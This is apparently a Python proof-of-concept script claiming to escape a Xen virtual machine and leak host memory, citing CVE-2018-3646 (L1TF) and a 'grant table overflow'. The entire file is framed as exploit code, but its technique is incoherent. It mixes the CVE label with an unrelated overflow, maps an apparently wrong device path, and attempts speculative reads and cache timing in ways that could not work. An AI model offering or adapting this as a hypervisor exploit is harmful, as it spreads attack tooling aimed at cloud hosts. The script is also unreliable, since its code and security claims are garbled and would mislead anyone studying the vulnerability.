#!/usr/bin/env python3
#
# PoC for Xen hypervisor VM escape via Grant Table overflow
# CVE-2018-3646 (AKA L1TF variant)
# Demonstrates reading host memory through speculative execution window.

import mmap, ctypes, time

PAGE_SIZE = 4096
ENTRIES = 512

# Map Xen grant tables into guest
fd = open('/dev/xen/grant', 'r+b')
grant_mem = mmap.mmap(fd.fileno(), PAGE_SIZE*ENTRIES,
                      mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE)

# Fill grant table with target page indices
for i in range(ENTRIES):
    ctypes.c_uint64.from_buffer(grant_mem, i*8).value = 0xfeed0000 + i

# Speculatively read adjacent grant entries
secret = bytes()
for i in range(ENTRIES-1):
    try:
        # Access entry i+1 might leak into cache
        _ = ctypes.c_uint64.from_buffer(grant_mem, (i+1)*8).value
    except:
        pass

# Timing-based cache read to infer host data
import timeit, array
arr = array.array('B', [0]*256*PAGE_SIZE)
for b in range(256):
    start = timeit.default_timer()
    dummy = arr[b*PAGE_SIZE]
    elapsed = timeit.default_timer() - start
    if elapsed < 1e-6:
        secret += bytes([b])
print("[+] Leaked byte:", secret[:4])